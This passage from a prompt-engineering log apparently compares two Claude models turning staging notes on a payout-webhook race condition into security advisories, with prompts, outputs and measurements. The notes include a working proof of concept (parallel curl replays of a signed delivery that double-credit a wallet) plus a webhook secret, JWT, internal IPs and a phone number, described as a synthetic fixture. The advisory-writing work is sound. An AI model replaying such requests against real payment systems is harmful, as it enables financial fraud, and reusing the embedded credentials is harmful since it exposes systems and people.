{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":0}

# grabbed a real signed delivery from provider sandbox dashboard -> "Download raw delivery"
# (any merchant user w/ 'viewer' role can download these, incl the X-Wallet-Signature header)
$ cat delivery_8812.json
{"event_id":"evt_01JB7K2Q8M","type":"payout.reversed","data":{"borrower_id":"brw_4471","amount_centavos":500000}}
$ SIG=$(cat delivery_8812.sig)   # sha256=3c1f0b...

# sequential replay -> blocked, ok
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"ok"}
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"duplicate_ignored"}

# reset wallet (WALLET_WEBHOOK_SECRET=stg_whk_9f2c4e71b8d03a56e1f7c2b94d8a6e30 from the stg .env, needed to re-sign test payloads w/ new event ids)
# PARALLEL replay of the same delivery ->
$ for i in 1 2; do curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json & done; wait
{"status":"ok"}{"status":"ok"}
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":1000000}
# ^^^ credited TWICE. 5000 pesos reversal -> 10000 in wallet

$ psql -h 10.42.0.23 -U payouts_ro -c "select id, borrower_id, amount_centavos, ref from wallet_ledger where ref='evt_01JB7K2Q8M';"
  id   | borrower_id | amount_centavos |      ref
-------+-------------+-----------------+---------------
 90311 | brw_4471    |          500000 | evt_01JB7K2Q8M
 90312 | brw_4471    |          500000 | evt_01JB7K2Q8M
(2 rows)

# repro rate: 20/20 with 2 parallel curls, nothing special needed, just fire both at once
# with 5 parallel -> got 3 credits once, 2 credits other times

$ sed -n '52,64p' src/webhooks/payoutStatus.ts
52  export async function handlePayoutStatus(req: Request, res: Response) {
53    const sig = req.header('X-Wallet-Signature')
54    if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
55    const evt = JSON.parse(req.rawBody.toString())
56    if (await db.processedEvents.exists(evt.event_id)) {
57      return res.status(200).json({ status: 'duplicate_ignored' })
58    }
59    if (evt.type === 'payout.reversed') {
60      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })
61    }
62    await db.processedEvents.insert(evt.event_id)
63    return res.status(200).json({ status: 'ok' })
64  }

# so: exists() check, then credit (await ~180ms, calls wallet svc), THEN insert. two requests both pass exists() before either inserts.
# processed_events.event_id has no unique constraint either (checked \d processed_events)
# also no timestamp in the signed payload / no tolerance window, signature never expires
# refunds webhook (src/webhooks/refundStatus.ts) prob has same pattern?? didnt check
# CVE?? ask kim. severity: bad lol. prob high
````

</details>

**Observed output.** Larger model ([full](./fl-02/runs/run-larger-v3-fewshot.md)):

```bash
curl -sk -H "Authorization: Bearer <REDACTED_JWT>" "https://192.0.2.10:8443/admin/wallets/<BORROWER_ID>"
```
```diff
-  if (await db.processedEvents.exists(evt.event_id)) {
-    return res.status(200).json({ status: 'duplicate_ignored' })
-  }
+  const claimed = await db.processedEvents.insertIfAbsent(evt.event_id)
+  if (!claimed) {
+    return res.status(200).json({ status: 'duplicate_ignored' })
+  }
```

**What changed in the output, and why.** This is the clearest single-technique effect in the whole
log:
- **The first unified diff appeared in *both* models**, which had produced 0 diffs across v0–v2.
- **The larger model copied the examples' conventions exactly:** `<REDACTED_JWT>`, RFC 5737
  documentation IPs (`192.0.2.10` for the gateway, `192.0.2.20` for the database), and every original
  `curl` flag kept.
- **Showing the transformation worked where describing it hadn't.** The larger model's v3 is the
  **only run that meets all four FL-01 "Done Well" criteria**: 6/6 sections, 155 s, 0 leaks, and
  1 correction.

**Its one correction:** *"CVE: Not assigned. A request is pending."* The notes only say "ask kim",
and nobody requested a CVE.

**The smaller model** also produced a diff, but still no CVSS, and no heading named "Root Cause" (its
root cause sits under "Affected code").

> **Brief vs. reality:** the brief predicted deterministic sanitization and a diff instead of prose
> advice (✅ both observed, in both models).

### v4 · Technique 4: Output Structure

**Exact diff added** (appended after the notes):

```diff
+ Output structure: return only the advisory, inside <advisory></advisory> tags, with no text before or after the tags. Use exactly these six Markdown sections, in this order:
+
+ ## 1. Metadata & CVSS v3.1
+ Advisory title, affected component and versions, CWE identifiers, the full CVSS v3.1 vector string (`CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_`), base score and severity. Write "CVE: not assigned" unless the notes contain an assigned CVE.
+ ## 2. Executive Summary
+ ## 3. Root Cause & Attack Surface
+ ## 4. Deterministic PoC Reproduction
+ ## 5. Unified Remediation Diff
+ ## 6. Secret & Factuality Audit Table
+ A table listing every sensitive value found in the notes and how it was redacted, plus every claim in the advisory and the line of the notes that supports it.
```

<details>
<summary><strong>Full assembled prompt v4</strong> (v3 + Output Structure, 763 words, exactly as sent: <a href="./fl-02/prompts/prompt-v4.txt"><code>prompt-v4.txt</code></a>)</summary>

````text
You are a Principal Application Security Researcher and Technical Advisory Editor. You write security advisories to the standard used by OWASP and GitHub Security Advisory (GHSA) maintainers.

Context: this advisory will be published to external client engineering leads and to the maintainers of a public repository. The notes come from an internal staging environment, so any token, secret, internal IP address, internal hostname, database user or personal data copied into the advisory would be a disclosure incident. Readers will act on what you write, so state only what the notes show: an exaggerated or unverified impact claim costs the researcher their credibility, and an invented identifier (such as a CVE number that has not been assigned) misleads the people patching.

Here are two examples of the transformations to apply.

<example>
<input>
$ curl -sk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWZ1bmQtYm90In0.ZmFrZS1zaWc" https://10.8.3.7:9443/internal/refunds?limit=5
</input>
<output>
```bash
curl -sk -H "Authorization: Bearer <REDACTED_JWT>" "https://192.0.2.10:9443/internal/refunds?limit=5"
```
Tokens and secrets become `<REDACTED_JWT>` / `<REDACTED_SECRET>`, internal IPs become RFC 5737 documentation addresses (`192.0.2.x`), internal hostnames become `api.example.test`, and every original curl flag is kept.
</output>
</example>

<example>
<input>
# think the refund handler trusts the amount from the client?? line 41ish
41    const amount = req.body.amount
42    await refunds.issue(order.id, amount)
</input>
<output>
Root cause: `src/refunds/handler.ts:41` reads `amount` from the untrusted request body and passes it to `refunds.issue()` (line 42) without comparing it to the stored order total (CWE-602).

```diff
-    const amount = req.body.amount
-    await refunds.issue(order.id, amount)
+    const amount = order.totalCentavos
+    await refunds.issue(order.id, amount)
```
</output>
</example>

Turn these terminal notes into a professional security vulnerability report:

## notes — payout-gateway webhook thing (staging) — 2026-11-03, jl
## env: payouts-stg.int.lending.local (10.42.0.19:8443), db 10.42.0.23
## version: payout-gateway@2.3.1 (package.json), commit 4be81c2

$ export TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdmMtb3BzLWNvbnNvbGUiLCJlbnYiOiJzdGFnaW5nIiwicm9sZSI6InBheW91dF9hZG1pbiIsImlhdCI6MTc5MzkwMDAwMH0.U1lOVEhFVElDLVRFU1QtU0lHTkFUVVJFLU5PVC1SRUFM
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":0}

# grabbed a real signed delivery from provider sandbox dashboard -> "Download raw delivery"
# (any merchant user w/ 'viewer' role can download these, incl the X-Wallet-Signature header)
$ cat delivery_8812.json
{"event_id":"evt_01JB7K2Q8M","type":"payout.reversed","data":{"borrower_id":"brw_4471","amount_centavos":500000}}
$ SIG=$(cat delivery_8812.sig)   # sha256=3c1f0b...

# sequential replay -> blocked, ok
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"ok"}
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"duplicate_ignored"}

# reset wallet (WALLET_WEBHOOK_SECRET=stg_whk_9f2c4e71b8d03a56e1f7c2b94d8a6e30 from the stg .env, needed to re-sign test payloads w/ new event ids)
# PARALLEL replay of the same delivery ->
$ for i in 1 2; do curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json & done; wait
{"status":"ok"}{"status":"ok"}
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":1000000}
# ^^^ credited TWICE. 5000 pesos reversal -> 10000 in wallet

$ psql -h 10.42.0.23 -U payouts_ro -c "select id, borrower_id, amount_centavos, ref from wallet_ledger where ref='evt_01JB7K2Q8M';"
  id   | borrower_id | amount_centavos |      ref
-------+-------------+-----------------+---------------
 90311 | brw_4471    |          500000 | evt_01JB7K2Q8M
 90312 | brw_4471    |          500000 | evt_01JB7K2Q8M
(2 rows)

# repro rate: 20/20 with 2 parallel curls, nothing special needed, just fire both at once
# with 5 parallel -> got 3 credits once, 2 credits other times

$ sed -n '52,64p' src/webhooks/payoutStatus.ts
52  export async function handlePayoutStatus(req: Request, res: Response) {
53    const sig = req.header('X-Wallet-Signature')
54    if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
55    const evt = JSON.parse(req.rawBody.toString())
56    if (await db.processedEvents.exists(evt.event_id)) {
57      return res.status(200).json({ status: 'duplicate_ignored' })
58    }
59    if (evt.type === 'payout.reversed') {
60      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })
61    }
62    await db.processedEvents.insert(evt.event_id)
63    return res.status(200).json({ status: 'ok' })
64  }

# so: exists() check, then credit (await ~180ms, calls wallet svc), THEN insert. two requests both pass exists() before either inserts.
# processed_events.event_id has no unique constraint either (checked \d processed_events)
# also no timestamp in the signed payload / no tolerance window, signature never expires
# refunds webhook (src/webhooks/refundStatus.ts) prob has same pattern?? didnt check
# CVE?? ask kim. severity: bad lol. prob high


Output structure: return only the advisory, inside <advisory></advisory> tags, with no text before or after the tags. Use exactly these six Markdown sections, in this order:

## 1. Metadata & CVSS v3.1
Advisory title, affected component and versions, CWE identifiers, the full CVSS v3.1 vector string (`CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_`), base score and severity. Write "CVE: not assigned" unless the notes contain an assigned CVE.
## 2. Executive Summary
## 3. Root Cause & Attack Surface
## 4. Deterministic PoC Reproduction
## 5. Unified Remediation Diff
## 6. Secret & Factuality Audit Table
A table listing every sensitive value found in the notes and how it was redacted, plus every claim in the advisory and the line of the notes that supports it.
````

</details>

**Observed output.** Smaller model ([full](./fl-02/runs/run-smaller-v4-structure.md)):

> | `payouts-stg.int.lending.local` | Internal hostname | `api.example.test` (used as host in examples; the advisory uses the IP form below for the curl commands) |
> | `10.42.0.19:8443` (gateway, 3 occurrences) | Internal IP | `192.0.2.10:8443` (RFC 5737) |
> | `09175550142` (`msisdn`) | Personal data (phone number) | Omitted |

The larger model's run was **cut off by safeguards in §4** ([truncated output](./fl-02/runs/run-larger-v4-structure-TRUNCATED.md)).
Its §1–§3 follow the schema exactly and include a request-interleaving table that shows the race step
by step.

**What changed in the output, and why.** The schema forced what earlier techniques couldn't:
- **The smaller model scored CVSS for the first time** (6.5, matching the reference), because §1
  demanded a vector.
- It hit **6/6 sections** and put **0 words outside `<advisory>`**.

**The schema also caused a regression, and the fault is in my prompt.** My §6 asked for *"a table
listing every sensitive value found in the notes and how it was redacted."* The model did exactly
that: it **re-printed the raw hostname, both IPs, the DB user and the phone number in the redaction
table**. That's 5 of 8 values leaked, from a section meant to prove nothing leaked.

It also made 1 factual error: `10.42.0.19` appears **6** times in the notes, not "3 occurrences".

> **Brief vs. reality:** the brief predicted the end of chatty filler (✅) and a miscalculated CVSS
> score on complex races (❌: every run's stated score matches the score computed from its vector,
> across all 11 runs). The real v4 failure is the audit-table leak, which the brief didn't anticipate.

### v5 · Technique 5: Step Decomposition (`<scratchpad>` before `<advisory>`)

**Exact diff added** (appended after the output structure):

```diff
+ Before writing the advisory, work through these four steps inside <scratchpad></scratchpad> tags, then write the advisory inside <advisory></advisory> tags. The scratchpad is the only text allowed before the advisory.
+ Step 1: Enumerate every secret, token, internal IP, internal hostname, database user and piece of personal data in the notes, and decide its redaction.
+ Step 2: Trace the untrusted input source → the vulnerable sink → the invariant that breaks.
+ Step 3: Derive each CVSS v3.1 metric (AV, AC, PR, UI, S, C, I, A) from specific evidence in the notes, and compute the base score.
+ Step 4: Check that every claim you will make maps to a line in the notes. Drop anything the notes do not show, including untested guesses and endpoints, files or identifiers that do not appear in the notes.
```

<details>
<summary><strong>Full assembled prompt v5</strong> (v4 + Step Decomposition, 896 words, exactly as sent: <a href="./fl-02/prompts/prompt-v5.txt"><code>prompt-v5.txt</code></a>)</summary>

````text
You are a Principal Application Security Researcher and Technical Advisory Editor. You write security advisories to the standard used by OWASP and GitHub Security Advisory (GHSA) maintainers.

Context: this advisory will be published to external client engineering leads and to the maintainers of a public repository. The notes come from an internal staging environment, so any token, secret, internal IP address, internal hostname, database user or personal data copied into the advisory would be a disclosure incident. Readers will act on what you write, so state only what the notes show: an exaggerated or unverified impact claim costs the researcher their credibility, and an invented identifier (such as a CVE number that has not been assigned) misleads the people patching.

Here are two examples of the transformations to apply.

<example>
<input>
$ curl -sk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWZ1bmQtYm90In0.ZmFrZS1zaWc" https://10.8.3.7:9443/internal/refunds?limit=5
</input>
<output>
```bash
curl -sk -H "Authorization: Bearer <REDACTED_JWT>" "https://192.0.2.10:9443/internal/refunds?limit=5"
```
Tokens and secrets become `<REDACTED_JWT>` / `<REDACTED_SECRET>`, internal IPs become RFC 5737 documentation addresses (`192.0.2.x`), internal hostnames become `api.example.test`, and every original curl flag is kept.
</output>
</example>

<example>
<input>
# think the refund handler trusts the amount from the client?? line 41ish
41    const amount = req.body.amount
42    await refunds.issue(order.id, amount)
</input>
<output>
Root cause: `src/refunds/handler.ts:41` reads `amount` from the untrusted request body and passes it to `refunds.issue()` (line 42) without comparing it to the stored order total (CWE-602).

```diff
-    const amount = req.body.amount
-    await refunds.issue(order.id, amount)
+    const amount = order.totalCentavos
+    await refunds.issue(order.id, amount)
```
</output>
</example>

Turn these terminal notes into a professional security vulnerability report:

## notes — payout-gateway webhook thing (staging) — 2026-11-03, jl
## env: payouts-stg.int.lending.local (10.42.0.19:8443), db 10.42.0.23
## version: payout-gateway@2.3.1 (package.json), commit 4be81c2

$ export TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdmMtb3BzLWNvbnNvbGUiLCJlbnYiOiJzdGFnaW5nIiwicm9sZSI6InBheW91dF9hZG1pbiIsImlhdCI6MTc5MzkwMDAwMH0.U1lOVEhFVElDLVRFU1QtU0lHTkFUVVJFLU5PVC1SRUFM
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":0}

# grabbed a real signed delivery from provider sandbox dashboard -> "Download raw delivery"
# (any merchant user w/ 'viewer' role can download these, incl the X-Wallet-Signature header)
$ cat delivery_8812.json
{"event_id":"evt_01JB7K2Q8M","type":"payout.reversed","data":{"borrower_id":"brw_4471","amount_centavos":500000}}
$ SIG=$(cat delivery_8812.sig)   # sha256=3c1f0b...

# sequential replay -> blocked, ok
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"ok"}
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"duplicate_ignored"}

# reset wallet (WALLET_WEBHOOK_SECRET=stg_whk_9f2c4e71b8d03a56e1f7c2b94d8a6e30 from the stg .env, needed to re-sign test payloads w/ new event ids)
# PARALLEL replay of the same delivery ->
$ for i in 1 2; do curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json & done; wait
{"status":"ok"}{"status":"ok"}
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":1000000}
# ^^^ credited TWICE. 5000 pesos reversal -> 10000 in wallet

$ psql -h 10.42.0.23 -U payouts_ro -c "select id, borrower_id, amount_centavos, ref from wallet_ledger where ref='evt_01JB7K2Q8M';"
  id   | borrower_id | amount_centavos |      ref
-------+-------------+-----------------+---------------
 90311 | brw_4471    |          500000 | evt_01JB7K2Q8M
 90312 | brw_4471    |          500000 | evt_01JB7K2Q8M
(2 rows)

# repro rate: 20/20 with 2 parallel curls, nothing special needed, just fire both at once
# with 5 parallel -> got 3 credits once, 2 credits other times

$ sed -n '52,64p' src/webhooks/payoutStatus.ts
52  export async function handlePayoutStatus(req: Request, res: Response) {
53    const sig = req.header('X-Wallet-Signature')
54    if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
55    const evt = JSON.parse(req.rawBody.toString())
56    if (await db.processedEvents.exists(evt.event_id)) {
57      return res.status(200).json({ status: 'duplicate_ignored' })
58    }
59    if (evt.type === 'payout.reversed') {
60      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })
61    }
62    await db.processedEvents.insert(evt.event_id)
63    return res.status(200).json({ status: 'ok' })
64  }

# so: exists() check, then credit (await ~180ms, calls wallet svc), THEN insert. two requests both pass exists() before either inserts.
# processed_events.event_id has no unique constraint either (checked \d processed_events)
# also no timestamp in the signed payload / no tolerance window, signature never expires
# refunds webhook (src/webhooks/refundStatus.ts) prob has same pattern?? didnt check
# CVE?? ask kim. severity: bad lol. prob high


Output structure: return only the advisory, inside <advisory></advisory> tags, with no text before or after the tags. Use exactly these six Markdown sections, in this order:

## 1. Metadata & CVSS v3.1
Advisory title, affected component and versions, CWE identifiers, the full CVSS v3.1 vector string (`CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_`), base score and severity. Write "CVE: not assigned" unless the notes contain an assigned CVE.
## 2. Executive Summary
## 3. Root Cause & Attack Surface
## 4. Deterministic PoC Reproduction
## 5. Unified Remediation Diff
## 6. Secret & Factuality Audit Table
A table listing every sensitive value found in the notes and how it was redacted, plus every claim in the advisory and the line of the notes that supports it.

Before writing the advisory, work through these four steps inside <scratchpad></scratchpad> tags, then write the advisory inside <advisory></advisory> tags. The scratchpad is the only text allowed before the advisory.
Step 1: Enumerate every secret, token, internal IP, internal hostname, database user and piece of personal data in the notes, and decide its redaction.
Step 2: Trace the untrusted input source → the vulnerable sink → the invariant that breaks.
Step 3: Derive each CVSS v3.1 metric (AV, AC, PR, UI, S, C, I, A) from specific evidence in the notes, and compute the base score.
Step 4: Check that every claim you will make maps to a line in the notes. Drop anything the notes do not show, including untested guesses and endpoints, files or identifiers that do not appear in the notes.
````

</details>

**Observed output.** Smaller model ([full](./fl-02/runs/run-smaller-v5-steps.md)):

> <scratchpad>
> Step 1 (secrets and identifiers): bearer token (L43), webhook signing secret (L59), signature value (L51),
> staging hostname and two internal IPs (L40-41, L44), DB user (L67), MSISDN (L45) […]
> Step 3 (CVSS): AV:N (webhook over HTTP). AC:L (20/20 with two parallel requests, L74). PR:L (a valid HMAC
> is required; L47-48 show a viewer-role merchant user can download a signed delivery). […] Base score 6.5 (Medium).
> Step 4 (claim check): […] Dropped: refundStatus.ts having the same pattern (L95, not checked), the CVE
> (L96, not assigned), and "severity: bad" (L96, replaced by the computed score).
> </scratchpad>

**What changed in the output, and why.** Making the model reason before writing changed *how* it
handled evidence:
- **The secret inventory moved into the scratchpad, by type and line number.** The scratchpad has
  **0/8 raw values**.
- **Leaks in the advisory dropped from 5/8 to 3/8:** the phone number and hostname no longer appear.
- **Factual corrections dropped from 1 to 0.**
- **Every CVSS metric is tied to a specific line.** I checked 9 citations against the prompt file
  (the notes start at line 39) and **all 9 point at the right line**.
- **Both traps were explicitly dropped:** the `refundStatus.ts` guess and the non-existent CVE.

**Still failing:** the §6 audit table still prints `10.42.0.19`, `10.42.0.23` and `payouts_ro` next to
their redactions. Step decomposition reduced the v4 leak but didn't remove it, because the §6
instruction still asks for "every sensitive value".

> **Brief vs. reality:** the brief predicted v5 would catch an `AC:H` vs `AC:L` error and meet every
> criterion on the first pass. Measured: the smaller model's v4 had **already** chosen `AC:L`, so there
> was no error to catch. And v5 **does not** meet criterion 4 (3 leaked values). The larger model's v5
> couldn't be tested (blocked).

---

## Section 3 · Cross-Model Comparison: Claude (larger) vs. Claude (smaller)

ChatGPT wasn't available in this session, so this compares two Claude models on the same prompts.
v0–v4 have outputs from both models; only the smaller model has a v5.

| Dimension | Larger model | Smaller model |
| --------- | ------------ | ------------- |
| **1. Tone** | Clinical, and the most hedged: 1,685–1,940 words per complete advisory, up to 7 "not verified / not tested" caveats (v2). Opened v0 and v1 with a conversational "Before you share this…" preamble. 0 promotional transitions ("ensure", "By implementing…") in any run. | Plain and short: 677–1,253 words for v0–v3, with no preambles in any run and 0 promotional transitions. |
| **2. Accuracy & sanitization** | Scored CVSS in every run (5/5), always with a written rationale. Chose `AC:H` in 3 of 5 runs, citing the unprocessed-event precondition my reference missed. Leaked only when the role made it explain redactions (v1: 3/8). | **Did not score CVSS at all in v0–v3 (0/4)** until the schema demanded it (v4). Afterwards it matched the reference (6.5) and cited 9 correct line numbers. Leaked 5/8 and then 3/8 through the audit table. |
| **3. Structure & tag adherence** | Followed the v4 schema exactly up to the safeguards cut-off. Never got to run v5. | **0 words outside `<advisory>` in v4 and v5**, a clean `<scratchpad>` → `<advisory>` boundary, and 6/6 sections. Before v4 its section names drifted (no "Root Cause" heading in v3). |
| **4. Specific failure points** | (a) **Echoes values while explaining their removal** (v1's "Removed from notes" table). (b) **Turns uncertainty into a range or a softer headline** (v2's `PR:N` 7.5 headline, with the 6.5 option buried). (c) **Safeguards stopped 2 of its 6 runs** on this security topic. | (a) **Skips judgment calls unless the format forces them** (no CVSS in v0–v3). (b) **Follows an instruction literally even when it defeats the instruction's purpose** (listed every sensitive value). (c) **Picked up repository context** it was told to ignore (`CLAUDE.md §3.2`). (d) Miscounted occurrences (3 vs. 6). |

**Verdict:** for this task the **larger model needs fewer techniques**: few-shot examples alone (v3)
produced a publishable advisory. The **smaller model needs the full scaffold** (structure plus step
decomposition) to score severity and stay inside the tags, and even then it leaks through any
instruction that asks it to list raw values. On both models, the biggest single lever was **showing
the transformation (few-shot)** rather than describing it.

---

## Section 4 · Final Stranger-Ready Reusable Template

### 🧩 Reusable Template: Raw Engineering/Security Notes → Verified Technical Advisory & Remediation Diff

This is v5 with every project detail replaced by a placeholder, plus **one fix this log earned**: §6
lists sensitive values **by type and line number only, never the value itself**. That fix is
**untested**; it targets the leak measured in v4 and v5. Fill in the placeholders and paste the result
into a fresh chat.

````text
You are a Principal Application Security Researcher and Technical Advisory Editor. You write security
advisories to the standard used by OWASP and GitHub Security Advisory (GHSA) maintainers.

Context: this advisory is for {{AUDIENCE_AND_DISCLOSURE_SCOPE}}. The notes come from
{{TARGET_SYSTEM_TYPE}}, so any value covered by the redaction rules below that is copied into the
advisory would be a disclosure incident. Readers will act on what you write, so state only what the
notes show: an exaggerated or unverified impact claim costs the researcher their credibility, and an
invented identifier (such as a CVE number that has not been assigned) misleads the people patching.

Redaction rules: {{REDACTION_RULES}}

Here are two examples of the transformations to apply.

<example>
<input>
$ curl -sk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWZ1bmQtYm90In0.ZmFrZS1zaWc" https://10.8.3.7:9443/internal/refunds?limit=5
</input>
<output>
```bash
curl -sk -H "Authorization: Bearer <REDACTED_JWT>" "https://192.0.2.10:9443/internal/refunds?limit=5"
```
Tokens and secrets become placeholders, internal IPs become RFC 5737 documentation addresses
(`192.0.2.x`), internal hostnames become `api.example.test`, and every original flag is kept.
</output>
</example>

<example>
<input>
# think the refund handler trusts the amount from the client?? line 41ish
41    const amount = req.body.amount
42    await refunds.issue(order.id, amount)
</input>
<output>
Root cause: `src/refunds/handler.ts:41` reads `amount` from the untrusted request body and passes it to
`refunds.issue()` (line 42) without comparing it to the stored order total (CWE-602).

```diff
-    const amount = req.body.amount
-    await refunds.issue(order.id, amount)
+    const amount = order.totalCentavos
+    await refunds.issue(order.id, amount)
```
</output>
</example>

Turn these terminal notes into a professional security vulnerability report:

{{RAW_TERMINAL_OR_BUG_NOTES}}

Output structure: return only the advisory, inside <advisory></advisory> tags, with no text before or
after the tags. Use exactly these six Markdown sections, in this order:

## 1. Metadata & CVSS v3.1
Advisory title, affected component and versions, CWE identifiers, the full CVSS v3.1 vector string
(`CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_`), base score and severity. Write "CVE: not assigned"
unless the notes contain an assigned CVE.
## 2. Executive Summary
## 3. Root Cause & Attack Surface
## 4. Deterministic PoC Reproduction
## 5. Unified Remediation Diff
## 6. Secret & Factuality Audit Table
A table listing each sensitive value found in the notes by its TYPE and NOTES LINE NUMBER only, and
the placeholder used. Never write the original value anywhere in the advisory, including this table.
Then list every claim in the advisory and the line of the notes that supports it.

Before writing the advisory, work through these four steps inside <scratchpad></scratchpad> tags, then
write the advisory inside <advisory></advisory> tags. The scratchpad is the only text allowed before
the advisory.
Step 1: Enumerate every secret, token, internal IP, internal hostname, database user and piece of
personal data in the notes by type and line number, and decide its redaction.
Step 2: Trace the untrusted input source → the vulnerable sink → the invariant that breaks.
Step 3: Derive each CVSS v3.1 metric (AV, AC, PR, UI, S, C, I, A) from specific evidence in the notes,
and compute the base score.
Step 4: Check that every claim you will make maps to a line in the notes. Drop anything the notes do
not show, including untested guesses and endpoints, files or identifiers that do not appear in the
notes.
````

| Placeholder | What to put there | Value used in this log |
| ----------- | ----------------- | ---------------------- |
| `{{AUDIENCE_AND_DISCLOSURE_SCOPE}}` | Who will read it, and how public it is | "external client engineering leads and the maintainers of a public repository" |
| `{{TARGET_SYSTEM_TYPE}}` | Where the notes came from | "an internal staging environment of a payout webhook service" |
| `{{REDACTION_RULES}}` | What counts as sensitive, and its placeholder | "tokens and secrets → `<REDACTED_JWT>` / `<REDACTED_SECRET>`; internal IPs → `192.0.2.x`; internal hosts → `api.example.test`; DB users and personal data → `<REDACTED_…>`" |
| `{{RAW_TERMINAL_OR_BUG_NOTES}}` | The notes, **already redacted by you** if they're real | The synthetic fixture in Section 1 |

**Three rules this log earned**

1. **Show, don't describe.** One input → output example did more than a paragraph of instructions
   (v3: the first diff in both models; on the larger model, the only run meeting all criteria).
2. **Never ask for a list of the secrets.** "List every sensitive value and its redaction" makes the
   model print them (v4, v5). Ask for type and line number.
3. **Recompute the score yourself.** Every stated score matched its vector, but the *metric choices*
   differed (`AC:H` vs `AC:L`, `PR:N` vs `PR:L`). Check the vector against the FIRST calculator, as
   FL-01 requires.

---

## Measurements

Re-run from the repository root (read-only):

```bash
python3 -I docs/fl-02/harness/measure.py
```

| Run | Words | Leaks in advisory | Leaks in scratchpad | Invented CVE IDs | FL-01 sections | CVSS v3.1 vector | Stated / computed score | vs. reference | Text outside tags |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| larger-v0-naive | 1718 | 0/8 | — | 0 | 5/6 (missing: Remediation diff) | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` | 6.5 / 6.5 | matches reference | no tags |
| larger-v1-role | 1940 | 3/8 (DB user, IP 10.42.0.19, IP 10.42.0.23) | — | 0 | 5/6 (missing: Remediation diff) | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` | 5.3 / 5.3 | AC:H (ref L) | no tags |
| larger-v2-context | 1848 | 0/8 | — | 0 | 5/6 (missing: Remediation diff) | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` (no `CVSS:3.1/` prefix) | 7.5 / 7.5 | PR:N (ref L) | no tags |
| larger-v3-fewshot | 1685 | 0/8 | — | 0 | 6/6 | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` | 5.3 / 5.3 | AC:H (ref L) | no tags |
| larger-v4-structure-TRUNCATED | 1362 | 0/8 | — | 0 | 5/6 (missing: Remediation diff) | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` | 5.3 / 5.3 | AC:H (ref L) | no tags |
| smaller-v0-naive | 1253 | 0/8 | — | 0 | 4/6 (missing: CVSS vector, Remediation diff) | none | — / — | — | no tags |
| smaller-v1-role | 903 | 0/8 | — | 0 | 4/6 (missing: CVSS vector, Remediation diff) | none | — / — | — | no tags |
| smaller-v2-context | 677 | 0/8 | — | 0 | 4/6 (missing: CVSS vector, Remediation diff) | none | — / — | — | no tags |
| smaller-v3-fewshot | 779 | 0/8 | — | 0 | 4/6 (missing: Root Cause, CVSS vector) | none | — / — | — | no tags |
